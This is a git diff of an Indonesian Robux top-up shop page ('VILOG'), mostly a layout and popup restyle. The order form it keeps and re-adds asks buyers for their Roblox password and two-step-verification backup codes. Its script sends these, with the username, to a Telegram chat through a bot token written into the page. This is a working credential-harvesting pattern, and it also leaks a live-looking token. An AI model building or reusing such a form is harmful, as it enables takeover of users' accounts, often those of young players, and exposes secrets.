@@ -6,198 +6,208 @@
 <title>Pricelist & Form Robux - VILOG</title>
 <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
-body { font-family:'Roboto',sans-serif; background:#fff; margin:0; padding:0; color:#333; font-size:12px;}
-.category { max-width:720px; margin:25px auto; padding:5px 12px;}
-.category h3 { text-align:center; margin-bottom:10px; font-size:12px; font-weight:700; color:#2c3e50;}
-.prcContainer { display:flex; flex-wrap:wrap; gap:8px; justify-content:center;}
-.bc { flex:0 1 calc(33.33% - 8px); background:#f9f9f9; border:1px solid #d1d9e6; border-radius:8px; padding:6px 4px; text-align:center; font-size:10px; font-weight:500; color:#333; cursor:pointer; transition:.2s; user-select:none;}
-.bc:hover { background:#eef3fa; border-color:#4a6fa1; transform:scale(1.04);}
-.bc span { display:block; font-weight:normal; font-size:10px; color:#555; margin-top:2px;}
-.form-container { max-width:400px; margin:20px auto 40px; background:#fafafa; border:1px solid #d1d9e6; border-radius:10px; padding:16px 18px; box-shadow:0 2px 8px rgba(0,0,0,.05);}
-.form-container h2 { text-align:center; margin-bottom:14px; font-size:15px; font-weight:700; color:#2c3e50;}
-.form-group { margin-bottom:10px;}
-label { font-size:11px; font-weight:500; display:block; margin-bottom:3px; color:#444;}
-input, select { width:100%; padding:7px; border:1px solid #ccc; border-radius:6px; font-size:11px; box-sizing:border-box;}
-button { width:100%; padding:9px; background:#4a6fa1; border:none; border-radius:6px; color:white; font-size:12px; font-weight:600; cursor:pointer; transition:.2s;}
-button:hover { background:#3a5f8a;}
-.hidden { display:none;}
-.notes { font-size:11px; color:#666; margin-top:3px;}
+  :root{--accent:#4a6fa1;--muted:#6b7280}
+  body { font-family:'Roboto',sans-serif; background:#fff; margin:0; padding:18px; color:#333; font-size:12px;}
+  .page { max-width:1100px; margin:0 auto; display:flex; gap:20px; align-items:flex-start; }
+  /* Left column (prices) */
+  .leftCol { flex:1 1 60%; }
+  .category { margin-bottom:18px; }
+  .category h3 { text-align:left; margin:0 0 10px; font-size:14px; font-weight:700; color:#2c3e50;}
+  .prcContainer { display:grid; grid-template-columns: repeat(3, 1fr); gap:8px; }
+  .bc { background:#f9f9f9; border:1px solid #d1d9e6; border-radius:8px; padding:10px 6px; text-align:center; font-size:12px; font-weight:500; color:#333; cursor:pointer; transition:.12s; user-select:none;}
+  .bc:hover { background:#eef3fa; border-color:var(--accent); transform:translateY(-3px); box-shadow:0 6px 18px rgba(74,111,161,0.06); }
+  .bc span { display:block; font-weight:normal; font-size:11px; color:#555; margin-top:6px;}
+  /* Right column (form) */
+  .rightCol { flex:0 0 360px; max-width:360px; }
+  .form-container { background:#fafafa; border:1px solid #d1d9e6; border-radius:10px; padding:16px 18px; box-shadow:0 2px 8px rgba(0,0,0,.04); }
+  .form-container h2 { text-align:center; margin:0 0 14px; font-size:16px; font-weight:700; color:#2c3e50; }
+  .form-group { margin-bottom:10px; }
+  label { font-size:12px; font-weight:500; display:block; margin-bottom:6px; color:#444; }
+  input, select { width:100%; padding:8px; border:1px solid #ccc; border-radius:6px; font-size:13px; box-sizing:border-box; }
+  button { width:100%; padding:10px; background:var(--accent); border:none; border-radius:6px; color:white; font-size:13px; font-weight:600; cursor:pointer; transition:.15s; }
+  button:hover { background:#3a5f8a; }
+  .hidden { display:none; }
+  .notes { font-size:11px; color:#666; margin-top:4px; }
 
-/* Payment Modal */
-.modal-backdrop {
-  position: fixed;
-  inset: 0;
-  background: rgba(0,0,0,0.45);
-  display: none;
-  align-items: center;
-  justify-content: center;
-  z-index: 9999;
-}
-.modal {
-  width: 320px;
-  max-width: calc(100% - 32px);
-  background: #fff;
-  border-radius: 12px;
-  padding: 16px;
-  box-shadow: 0 8px 30px rgba(0,0,0,0.25);
-  text-align: center;
-}
-.modal h3 { margin: 0 0 8px; font-size: 15px; color: #23314a; }
-.modal .qr { width: 180px; height: 180px; object-fit: cover; margin: 8px auto; border-radius: 8px; border: 1px solid #e6e6e6; }
-.modal .amount { font-size: 18px; font-weight: 700; margin-top: 8px; color: #1b3b6f; }
-.modal .pay-note { font-size: 12px; color: #555; margin-top: 8px; }
-.modal .actions { display: flex; gap: 8px; margin-top: 12px; }
-.modal .actions button { flex: 1; padding: 8px; font-size: 13px; }
-.modal .small-note { font-size: 11px; color: #888; margin-top: 10px; }
-.copy-success { font-size: 12px; color: green; margin-top: 6px; }
+  /* Payment Modal */
+  .modal-backdrop {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.45);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 9999;
+  }
+  .modal {
+    width: 340px;
+    max-width: calc(100% - 32px);
+    background: #fff;
+    border-radius: 12px;
+    padding: 16px;
+    box-shadow: 0 8px 30px rgba(0,0,0,0.25);
+    text-align: center;
+  }
+  .modal h3 { margin: 0 0 8px; font-size: 15px; color: #23314a; }
+  .modal .qr { width: 180px; height: 180px; object-fit: cover; margin: 8px auto; border-radius: 8px; border: 1px solid #e6e6e6; }
+  .modal .amount { font-size: 18px; font-weight: 700; margin-top: 8px; color: #1b3b6f; }
+  .modal .pay-note { font-size: 12px; color: #555; margin-top: 8px; }
+  .modal .actions { display: flex; gap: 8px; margin-top: 12px; }
+  .modal .actions button { flex: 1; padding: 8px; font-size: 13px; }
+  .modal .small-note { font-size: 11px; color: #888; margin-top: 10px; }
+  .copy-success { font-size: 12px; color: green; margin-top: 6px; }
 
-/* Validation popup (top-right) */
-.validation-popup {
-  position: fixed;
-  top: 18px;
-  right: 18px;
-  max-width: 320px;
-  background: linear-gradient(180deg,#fff,#fbfbfd);
-  border: 1px solid #e2e8f0;
-  box-shadow: 0 8px 30px rgba(35,49,74,0.12);
-  border-radius: 8px;
-  padding: 12px 14px;
-  z-index: 10001;
-  display: flex;
-  gap: 10px;
-  align-items: flex-start;
-  animation: slideIn 220ms ease;
-  font-size: 13px;
-}
-@keyframes slideIn { from { transform: translateY(-8px); opacity:0 } to { transform: translateY(0); opacity:1 } }
-.validation-popup .msg {
-  color: #1f2937;
-  line-height:1.2;
-  flex:1;
-}
-.validation-popup .close-btn {
-  background: transparent;
-  border: none;
-  font-size: 16px;
-  color: #6b7280;
-  cursor: pointer;
-  padding: 4px;
-  border-radius: 4px;
-}
-.validation-popup .close-btn:hover { background: rgba(0,0,0,0.04); color:#374151; }
+  /* Centered validation popup (modal-like) */
+  .validation-center {
+    position: fixed;
+    left: 50%;
+    top: 50%;
+    transform: translate(-50%,-50%);
+    z-index: 11000;
+    min-width: 260px;
+    max-width: 92%;
+    background: linear-gradient(180deg,#fff,#fbfbfd);
+    border: 1px solid #e6e6e6;
+    box-shadow: 0 12px 40px rgba(35,49,74,0.16);
+    border-radius: 10px;
+    padding: 14px 16px;
+    display: flex;
+    gap: 12px;
+    align-items: center;
+    justify-content: space-between;
+    animation: popIn .14s ease;
+  }
+  .validation-center .txt { flex:1; font-size:14px; color:#111827; }
+  .validation-center .xbtn { background:transparent; border:none; font-size:18px; color:var(--muted); cursor:pointer; padding:6px; border-radius:6px; }
+  .validation-center .xbtn:focus { outline:2px solid rgba(74,111,161,0.18); }
 
-/* small responsive adjustments */
-@media (max-width:420px){
-  .validation-popup { left: 12px; right: 12px; top:12px; max-width:calc(100% - 24px); }
-}
+  @keyframes popIn { from { transform: translate(-50%,-52%) scale(.98); opacity:0 } to { transform: translate(-50%,-50%) scale(1); opacity:1 } }
+
+  /* responsive: stack on small screens */
+  @media (max-width:880px){
+    .page { flex-direction:column; padding:12px; }
+    .leftCol, .rightCol { width:100%; max-width:100%; }
+    .prcContainer { grid-template-columns: repeat(2, 1fr); }
+    .rightCol { order:2; }
+  }
+  @media (max-width:520px){
+    .prcContainer { grid-template-columns: repeat(1, 1fr); }
+  }
 </style>
 </head>
 <body>
 
-<!-- Reguler -->
-<div class="category">
-<h3>Robux Reguler</h3>
-<div class="prcContainer">
-<div class="bc" data-nm="80 Robux" data-hg="16000" data-kt="reg">80 Robux<span>Rp16.000</span></div>
-<div class="bc" data-nm="160 Robux" data-hg="32000" data-kt="reg">160 Robux<span>Rp32.000</span></div>
-<div class="bc" data-nm="240 Robux" data-hg="48000" data-kt="reg">240 Robux<span>Rp48.000</span></div>
-<div class="bc" data-nm="320 Robux" data-hg="62000" data-kt="reg">320 Robux<span>Rp62.000</span></div>
-<div class="bc" data-nm="400 Robux" data-hg="75000" data-kt="reg">400 Robux<span>Rp75.000</span></div>
-<div class="bc" data-nm="480 Robux" data-hg="91000" data-kt="reg">480 Robux<span>Rp91.000</span></div>
-<div class="bc" data-nm="560 Robux" data-hg="107000" data-kt="reg">560 Robux<span>Rp107.000</span></div>
-<div class="bc" data-nm="640 Robux" data-hg="123000" data-kt="reg">640 Robux<span>Rp123.000</span></div>
-<div class="bc" data-nm="720 Robux" data-hg="137500" data-kt="reg">720 Robux<span>Rp137.500</span></div>
-<div class="bc" data-nm="800 Robux" data-hg="155000" data-kt="reg">800 Robux<span>Rp155.000</span></div>
-<div class="bc" data-nm="1700 Robux" data-hg="310000" data-kt="reg">1.700 Robux<span>Rp310.000</span></div>
-<div class="bc" data-nm="2100 Robux" data-hg="387500" data-kt="reg">2.100 Robux<span>Rp387.500</span></div>
-<div class="bc" data-nm="3400 Robux" data-hg="610000" data-kt="reg">3.400 Robux<span>Rp610.000</span></div>
-<div class="bc" data-nm="4500 Robux" data-hg="775000" data-kt="reg">4.500 Robux<span>Rp775.000</span></div>
-<div class="bc" data-nm="10000 Robux" data-hg="1550000" data-kt="reg">10.000 Robux<span>Rp1.550.000</span></div>
-</div>
-</div>
+<div class="page">
+  <!-- LEFT: priceboxes -->
+  <div class="leftCol">
+    <!-- Reguler -->
+    <div class="category">
+      <h3>Robux Reguler</h3>
+      <div class="prcContainer">
+        <div class="bc" data-nm="80 Robux" data-hg="16000" data-kt="reg">80 Robux<span>Rp16.000</span></div>
+        <div class="bc" data-nm="160 Robux" data-hg="32000" data-kt="reg">160 Robux<span>Rp32.000</span></div>
+        <div class="bc" data-nm="240 Robux" data-hg="48000" data-kt="reg">240 Robux<span>Rp48.000</span></div>
+        <div class="bc" data-nm="320 Robux" data-hg="62000" data-kt="reg">320 Robux<span>Rp62.000</span></div>
+        <div class="bc" data-nm="400 Robux" data-hg="75000" data-kt="reg">400 Robux<span>Rp75.000</span></div>
+        <div class="bc" data-nm="480 Robux" data-hg="91000" data-kt="reg">480 Robux<span>Rp91.000</span></div>
+        <div class="bc" data-nm="560 Robux" data-hg="107000" data-kt="reg">560 Robux<span>Rp107.000</span></div>
+        <div class="bc" data-nm="640 Robux" data-hg="123000" data-kt="reg">640 Robux<span>Rp123.000</span></div>
+        <div class="bc" data-nm="720 Robux" data-hg="137500" data-kt="reg">720 Robux<span>Rp137.500</span></div>
+        <div class="bc" data-nm="800 Robux" data-hg="155000" data-kt="reg">800 Robux<span>Rp155.000</span></div>
+        <div class="bc" data-nm="1700 Robux" data-hg="310000" data-kt="reg">1.700 Robux<span>Rp310.000</span></div>
+        <div class="bc" data-nm="2100 Robux" data-hg="387500" data-kt="reg">2.100 Robux<span>Rp387.500</span></div>
+        <div class="bc" data-nm="3400 Robux" data-hg="610000" data-kt="reg">3.400 Robux<span>Rp610.000</span></div>
+        <div class="bc" data-nm="4500 Robux" data-hg="775000" data-kt="reg">4.500 Robux<span>Rp775.000</span></div>
+        <div class="bc" data-nm="10000 Robux" data-hg="1550000" data-kt="reg">10.000 Robux<span>Rp1.550.000</span></div>
+      </div>
+    </div>
 
-<!-- Special -->
-<div class="category">
-<h3>Robux Special</h3>
-<div class="prcContainer">
-<div class="bc" data-nm="500 Robux" data-hg="75000" data-kt="spc">500 Robux<span>Rp75.000</span></div>
-<div class="bc" data-nm="1000 Robux" data-hg="148000" data-kt="spc">1.000 Robux<span>Rp148.000</span></div>
-<div class="bc" data-nm="1500 Robux" data-hg="222000" data-kt="spc">1.500 Robux<span>Rp222.000</span></div>
-<div class="bc" data-nm="2000 Robux" data-hg="296000" data-kt="spc">2.000 Robux<span>Rp296.000</span></div>
-<div class="bc" data-nm="2500 Robux" data-hg="367500" data-kt="spc">2.500 Robux<span>Rp367.500</span></div>
-<div class="bc" data-nm="3000 Robux" data-hg="441000" data-kt="spc">3.000 Robux<span>Rp441.000</span></div>
-<div class="bc" data-nm="3500 Robux" data-hg="514500" data-kt="spc">3.500 Robux<span>Rp514.500</span></div>
-<div class="bc" data-nm="4000 Robux" data-hg="588000" data-kt="spc">4.000 Robux<span>Rp588.000</span></div>
-<div class="bc" data-nm="5000 Robux" data-hg="735000" data-kt="spc">5.000 Robux<span>Rp735.000</span></div>
-<div class="bc" data-nm="6000 Robux" data-hg="876000" data-kt="spc">6.000 Robux<span>Rp876.000</span></div>
-</div>
-</div>
+    <!-- Special -->
+    <div class="category">
+      <h3>Robux Special</h3>
+      <div class="prcContainer">
+        <div class="bc" data-nm="500 Robux" data-hg="75000" data-kt="spc">500 Robux<span>Rp75.000</span></div>
+        <div class="bc" data-nm="1000 Robux" data-hg="148000" data-kt="spc">1.000 Robux<span>Rp148.000</span></div>
+        <div class="bc" data-nm="1500 Robux" data-hg="222000" data-kt="spc">1.500 Robux<span>Rp222.000</span></div>
+        <div class="bc" data-nm="2000 Robux" data-hg="296000" data-kt="spc">2.000 Robux<span>Rp296.000</span></div>
+        <div class="bc" data-nm="2500 Robux" data-hg="367500" data-kt="spc">2.500 Robux<span>Rp367.500</span></div>
+        <div class="bc" data-nm="3000 Robux" data-hg="441000" data-kt="spc">3.000 Robux<span>Rp441.000</span></div>
+        <div class="bc" data-nm="3500 Robux" data-hg="514500" data-kt="spc">3.500 Robux<span>Rp514.500</span></div>
+        <div class="bc" data-nm="4000 Robux" data-hg="588000" data-kt="spc">4.000 Robux<span>Rp588.000</span></div>
+        <div class="bc" data-nm="5000 Robux" data-hg="735000" data-kt="spc">5.000 Robux<span>Rp735.000</span></div>
+        <div class="bc" data-nm="6000 Robux" data-hg="876000" data-kt="spc">6.000 Robux<span>Rp876.000</span></div>
+      </div>
+    </div>
 
-<!-- Premium -->
-<div class="category">
-<h3>Robux Premium</h3>
-<div class="prcContainer">
-<div class="bc" data-nm="450 Robux + Premium" data-hg="75000" data-kt="pre">450 Robux + Premium<span>Rp75.000</span></div>
-<div class="bc" data-nm="1000 Robux + Premium" data-hg="148000" data-kt="pre">1.000 Robux + Premium<span>Rp148.000</span></div>
-<div class="bc" data-nm="1550 Robux + Premium" data-hg="222000" data-kt="pre">1.550 Robux + Premium<span>Rp222.000</span></div>
-<div class="bc" data-nm="2200 Robux + Premium" data-hg="296000" data-kt="pre">2.200 Robux + Premium<span>Rp296.000</span></div>
-<div class="bc" data-nm="2750 Robux + Premium" data-hg="367500" data-kt="pre">2.750 Robux + Premium<span>Rp367.500</span></div>
-<div class="bc" data-nm="3300 Robux + Premium" data-hg="441000" data-kt="pre">3.300 Robux + Premium<span>Rp441.000</span></div>
-</div>
-</div>
+    <!-- Premium -->
+    <div class="category">
+      <h3>Robux Premium</h3>
+      <div class="prcContainer">
+        <div class="bc" data-nm="450 Robux + Premium" data-hg="75000" data-kt="pre">450 Robux + Premium<span>Rp75.000</span></div>
+        <div class="bc" data-nm="1000 Robux + Premium" data-hg="148000" data-kt="pre">1.000 Robux + Premium<span>Rp148.000</span></div>
+        <div class="bc" data-nm="1550 Robux + Premium" data-hg="222000" data-kt="pre">1.550 Robux + Premium<span>Rp222.000</span></div>
+        <div class="bc" data-nm="2200 Robux + Premium" data-hg="296000" data-kt="pre">2.200 Robux + Premium<span>Rp296.000</span></div>
+        <div class="bc" data-nm="2750 Robux + Premium" data-hg="367500" data-kt="pre">2.750 Robux + Premium<span>Rp367.500</span></div>
+        <div class="bc" data-nm="3300 Robux + Premium" data-hg="441000" data-kt="pre">3.300 Robux + Premium<span>Rp441.000</span></div>
+      </div>
+    </div>
+  </div>
 
-<!-- Form -->
-<div class="form-container" id="orderSection">
-<h2>Form Pembelian Robux VILOG</h2>
-<form id="frm">
-<div class="form-group">
-<label for="usr">Username Roblox *</label>
-<input type="text" id="usr" name="usr" placeholder="Username Roblox" required>
-</div>
-<div class="form-group">
-<label for="pwd">Password Roblox *</label>
-<input type="password" id="pwd" name="pwd" placeholder="Password Roblox" required>
-</div>
-<div class="form-group">
-<label for="v2">V2L *</label>
-<select id="v2" name="v2" required>
-<option value="">-- Pilih Status --</option>
-<option value="OFF">OFF</option>
-<option value="ON">ON</option>
-</select>
-</div>
-<div class="form-group hidden" id="v2m_div">
-<label for="v2m">Metode V2L *</label>
-<select id="v2m" name="v2m">
-<option value="">-- Pilih Metode --</option>
-<option value="BC">Backup Code</option>
-<option value="EM">Kode Email</option>
-</select>
-</div>
-<div class="form-group hidden" id="bc_div">
-<label for="bc">Backup Code *</label>
-<input type="text" id="bc" name="bc" placeholder="Isi Backup Code">
-<div class="notes">Masukkan 1-3 backup code yang belum dipakai.</div>
-</div>
-<div class="form-group hidden" id="em_div">
-<div class="notes">Pastikan storage email tidak penuh, standby & fast respon.</div>
-</div>
-<div class="form-group">
-<label for="kt">Kategori *</label>
-<input type="text" id="kt" name="kt" readonly required>
-</div>
-<div class="form-group">
-<label for="nm">Nominal *</label>
-<input type="text" id="nm" name="nm" readonly required>
-</div>
-<div class="form-group">
-<label for="hg">Harga *</label>
-<input type="text" id="hg" name="hg" readonly required>
-</div>
-<div style="text-align:center; margin:14px 0 6px;">
-<button type="button" id="btnTg">Pesan via Telegram</button>
-</div>
-</form>
+  <!-- RIGHT: form -->
+  <div class="rightCol">
+    <div class="form-container" id="orderSection">
+      <h2>Form Pembelian Robux VILOG</h2>
+      <form id="frm">
+        <div class="form-group">
+          <label for="usr">Username Roblox *</label>
+          <input type="text" id="usr" name="usr" placeholder="Username Roblox" required>
+        </div>
+        <div class="form-group">
+          <label for="pwd">Password Roblox *</label>
+          <input type="password" id="pwd" name="pwd" placeholder="Password Roblox" required>
+        </div>
+        <div class="form-group">
+          <label for="v2">V2L *</label>
+          <select id="v2" name="v2" required>
+            <option value="">-- Pilih Status --</option>
+            <option value="OFF">OFF</option>
+            <option value="ON">ON</option>
+          </select>
+        </div>
+        <div class="form-group hidden" id="v2m_div">
+          <label for="v2m">Metode V2L *</label>
+          <select id="v2m" name="v2m">
+            <option value="">-- Pilih Metode --</option>
+            <option value="BC">Backup Code</option>
+            <option value="EM">Kode Email</option>
+          </select>
+        </div>
+        <div class="form-group hidden" id="bc_div">
+          <label for="bc">Backup Code *</label>
+          <input type="text" id="bc" name="bc" placeholder="Isi Backup Code">
+          <div class="notes">Masukkan 1-3 backup code yang belum dipakai.</div>
+        </div>
+        <div class="form-group hidden" id="em_div">
+          <div class="notes">Pastikan storage email tidak penuh, standby & fast respon.</div>
+        </div>
+        <div class="form-group">
+          <label for="kt">Kategori *</label>
+          <input type="text" id="kt" name="kt" readonly required>
+        </div>
+        <div class="form-group">
+          <label for="nm">Nominal *</label>
+          <input type="text" id="nm" name="nm" readonly required>
+        </div>
+        <div class="form-group">
+          <label for="hg">Harga *</label>
+          <input type="text" id="hg" name="hg" readonly required>
+        </div>
+        <div style="text-align:center; margin:14px 0 6px;">
+          <button type="button" id="btnTg">Pesan via Telegram</button>
+        </div>
+      </form>
+    </div>
+  </div>
 </div>
 
 <!-- Payment Modal (hidden by default) -->
@@ -219,78 +229,145 @@ button:hover { background:#3a5f8a;}
   </div>
 </div>
 
-<!-- container for validation popup (injected) -->
+<!-- validation container will hold center popup -->
 <div id="validationContainer"></div>
 
 <script>
+/* === helper & fill logic (IDs unchanged) === */
 function sanitize(v){return v?Number(String(v).replace(/\D+/g,'')):NaN;}
-function fill({nmText,hgRaw,ktVal}){document.getElementById('nm').value=nmText||''; document.getElementById('kt').value=ktVal||''; const h=sanitize(hgRaw); document.getElementById('hg').value=!isNaN(h)?'Rp'+new Intl.NumberFormat('id-ID').format(h):hgRaw; const el=document.querySelector('.form-container')||document.getElementById('orderSection'); if(el){el.scrollIntoView({behavior:'smooth',block:'center'}); document.getElementById('usr').focus();}}
+function fill({nmText,hgRaw,ktVal}) {
+  document.getElementById('nm').value = nmText||'';
+  document.getElementById('kt').value = ktVal||'';
+  const h = sanitize(hgRaw);
+  document.getElementById('hg').value = !isNaN(h) ? 'Rp'+new Intl.NumberFormat('id-ID').format(h) : hgRaw;
+  const el = document.querySelector('.form-container') || document.getElementById('orderSection');
+  if(el){
+    el.scrollIntoView({behavior:'smooth', block:'center'});
+    // focus username for quick input
+    setTimeout(()=> document.getElementById('usr').focus(), 200);
+  }
+}
 
-function showValidationPopup(message){
-  // If existing popup, remove it first to avoid duplicates
-  const existing = document.getElementById('validationPopup');
+/* === centered validation popup (autofocus) === */
+function showValidationPopupCenter(message){
+  // remove existing if any
+  const existing = document.getElementById('validationCenterPopup');
   if(existing) existing.remove();
 
   const container = document.getElementById('validationContainer') || document.body;
   const popup = document.createElement('div');
-  popup.id = 'validationPopup';
-  popup.className = 'validation-popup';
+  popup.id = 'validationCenterPopup';
+  popup.className = 'validation-center';
+  // make focusable
+  popup.tabIndex = -1;
   popup.innerHTML = `
-    <div class="msg">${message}</div>
-    <button class="close-btn" aria-label="Tutup">✕</button>
+    <div class="txt">${message}</div>
+    <button class="xbtn" aria-label="Tutup">✕</button>
   `;
   container.appendChild(popup);
 
-  const closeBtn = popup.querySelector('.close-btn');
-  const removePopup = () => {
-    if(popup){
-      popup.style.transition = 'opacity 140ms ease, transform 140ms ease';
-      popup.style.opacity = '0';
-      popup.style.transform = 'translateY(-6px)';
-      setTimeout(()=> popup.remove(), 160);
-    }
-  };
+  const closeBtn = popup.querySelector('.xbtn');
+  // focus popup (so screen readers / keyboard users land here)
+  popup.focus({preventScroll:true});
+
+  function removePopup(){
+    if(!popup) return;
+    popup.style.transition = 'opacity 160ms ease, transform 160ms ease';
+    popup.style.opacity = '0';
+    popup.style.transform = 'translate(-50%,-50%) scale(.98)';
+    setTimeout(()=> popup.remove(), 170);
+  }
   closeBtn.addEventListener('click', removePopup);
 
-  // auto-hide after 5s
-  const autoHide = setTimeout(removePopup, 5000);
-
-  // remove on user navigation or pagehide
-  window.addEventListener('pagehide', ()=>{ clearTimeout(autoHide); if(popup) popup.remove(); }, { once: true });
+  // auto-hide after 4s
+  const t = setTimeout(removePopup, 4000);
+  // cleanup on pagehide
+  window.addEventListener('pagehide', ()=>{ clearTimeout(t); if(popup) popup.remove(); }, { once:true });
 }
 
-document.addEventListener('DOMContentLoaded',function(){
-  document.querySelectorAll('.bc').forEach(b=>b.addEventListener('click',()=>fill({nmText:b.getAttribute('data-nm')||b.textContent.trim(), hgRaw:b.getAttribute('data-hg')||'', ktVal:b.getAttribute('data-kt')||''})));
-  const v2=document.getElementById('v2'); const v2m=document.getElementById('v2m'); const bcDiv=document.getElementById('bc_div'); const emDiv=document.getElementById('em_div');
-  v2.addEventListener('change',()=>{if(v2.value==='ON'){v2m.parentElement.classList.remove('hidden');}else{v2m.parentElement.classList.add('hidden'); bcDiv.classList.add('hidden'); emDiv.classList.add('hidden');}});
-  v2m.addEventListener('change',()=>{if(v2m.value==='BC'){bcDiv.classList.remove('hidden'); emDiv.classList.add('hidden');}else if(v2m.value==='EM'){emDiv.classList.remove('hidden'); bcDiv.classList.add('hidden');}else{bcDiv.classList.add('hidden'); emDiv.classList.add('hidden');}});
+/* === main init === */
+document.addEventListener('DOMContentLoaded', function(){
+  // price boxes click
+  document.querySelectorAll('.bc').forEach(b=>{
+    b.addEventListener('click', ()=> fill({
+      nmText: b.getAttribute('data-nm') || b.textContent.trim(),
+      hgRaw: b.getAttribute('data-hg') || '',
+      ktVal: b.getAttribute('data-kt') || ''
+    }));
+  });
 
-  document.getElementById('btnTg').addEventListener('click',()=>{
-    const f=document.getElementById('frm'); const req=f.querySelectorAll('input[required],select[required]');
+  // V2L logic using existing IDs
+  const v2 = document.getElementById('v2');
+  const v2m = document.getElementById('v2m');
+  const bcDiv = document.getElementById('bc_div');
+  const emDiv = document.getElementById('em_div');
+
+  v2.addEventListener('change', ()=>{
+    if(v2.value === 'ON'){
+      v2m.parentElement.classList.remove('hidden');
+    } else {
+      v2m.parentElement.classList.add('hidden');
+      bcDiv.classList.add('hidden');
+      emDiv.classList.add('hidden');
+    }
+  });
+
+  v2m.addEventListener('change', ()=>{
+    if(v2m.value === 'BC'){
+      bcDiv.classList.remove('hidden');
+      emDiv.classList.add('hidden');
+    } else if(v2m.value === 'EM'){
+      emDiv.classList.remove('hidden');
+      bcDiv.classList.add('hidden');
+    } else {
+      bcDiv.classList.add('hidden');
+      emDiv.classList.add('hidden');
+    }
+  });
+
+  // send via telegram
+  document.getElementById('btnTg').addEventListener('click', ()=>{
+    const f = document.getElementById('frm');
+    const req = f.querySelectorAll('input[required], select[required]');
     for(const i of req){
       if(!i.value.trim()){
-        // replace native alert with custom popup
-        showValidationPopup('harap isi semua kolom!');
-        i.focus();
+        // show centered popup and autofocus it
+        showValidationPopupCenter('harap isi semua kolom!');
+        // focus the missing element for convenience
+        try{ i.focus(); }catch(e){}
         return;
       }
     }
-    const u=document.getElementById('usr').value; const p=document.getElementById('pwd').value; const v=v2.value; const vm=v2m.value; const b=bcDiv.querySelector('input')?.value||''; const kt=document.getElementById('kt').value; const nm=document.getElementById('nm').value; const hg=document.getElementById('hg').value;
-    const token='1868293159:AAF7IWMtOEqmVqEkBAfCTexkj_siZiisC0E'; const chatId='-1002801058966';
-    const txt='Pesanan Baru Masuk!\n\nUsername: '+u+'\nPassword: '+p+'\nV2L: '+v+(vm? ' ('+vm+')':'')+(b?'\nBackup Code: '+b:'')+'\nKategori: '+kt+'\nNominal: '+nm+'\nHarga: '+hg;
 
-    fetch('https://api.telegram.org/bot'+token+'/sendMessage',{method:'POST',headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:chatId,text:txt})})
-      .then(res=>{
-        if(res.ok){
-          // Tampilkan payment popup (modal) alur sama seperti sebelumnya
-          const qrUrl = "https://payment.uwu.ai/assets/images/gallery03/8555ed8a_original.jpg?v=58e63277";
-          showPaymentPopup(qrUrl, hg);
-          f.reset();
-        } else {
-          alert('Gagal kirim ke Telegram');
-        }
-      })
-      .catch(()=>alert('Terjadi kesalahan.'));
+    const u = document.getElementById('usr').value;
+    const p = document.getElementById('pwd').value;
+    const v = v2.value;
+    const vm = v2m.value;
+    const b = bcDiv.querySelector('input')?.value || '';
+    const kt = document.getElementById('kt').value;
+    const nm = document.getElementById('nm').value;
+    const hg = document.getElementById('hg').value;
+
+    const token = '1868293159:AAF7IWMtOEqmVqEkBAfCTexkj_siZiisC0E';
+    const chatId = '-1002801058966';
+    const txt = 'Pesanan Baru Masuk!\n\nUsername: '+u+'\nPassword: '+p+'\nV2L: '+v+(vm? ' ('+vm+')':'')+(b?'\nBackup Code: '+b:'')+'\nKategori: '+kt+'\nNominal: '+nm+'\nHarga: '+hg;
+
+    fetch('https://api.telegram.org/bot'+token+'/sendMessage',{
+      method:'POST',
+      headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({chat_id:chatId, text:txt})
+    })
+    .then(res=>{
+      if(res.ok){
+        const qrUrl = "https://payment.uwu.ai/assets/images/gallery03/8555ed8a_original.jpg?v=58e63277";
+        showPaymentPopup(qrUrl, hg);
+        f.reset();
+      } else {
+        // keep this simple native alert for failure (you can switch to custom popup later)
+        alert('Gagal kirim ke Telegram');
+      }
+    })
+    .catch(()=> alert('Terjadi kesalahan.'));
   });
 
   /* Modal functions (memakai id / variabel sesuai file) */
@@ -303,7 +380,7 @@ document.addEventListener('DOMContentLoaded',function(){
     // Set QR
     modalQr.src = qrUrl;
 
-    // Format harga jika perlu (hg sudah berformat 'Rp...') 
+    // Format harga jika perlu
     let amountText = hargaFormatted || '';
     if(!/^Rp/i.test(amountText)){
       const num = Number(String(amountText).replace(/[^\d]/g,''));
@@ -349,7 +426,7 @@ document.addEventListener('DOMContentLoaded',function(){
       });
     };
 
-    // Buka bot: auto /start, detect mobile vs desktop, try tg:// then fallback ke https
+    // Buka bot auto /start dengan detection
     document.getElementById('openBotBtn').onclick = function(){
       const botUsername = 'topupgamesbot';
       const tgScheme = 'tg://resolve?domain=' + encodeURIComponent(botUsername);
@@ -384,7 +461,7 @@ document.addEventListener('DOMContentLoaded',function(){
     };
   }
 
-});
+}); // DOMContentLoaded
 </script>
 
 </body>
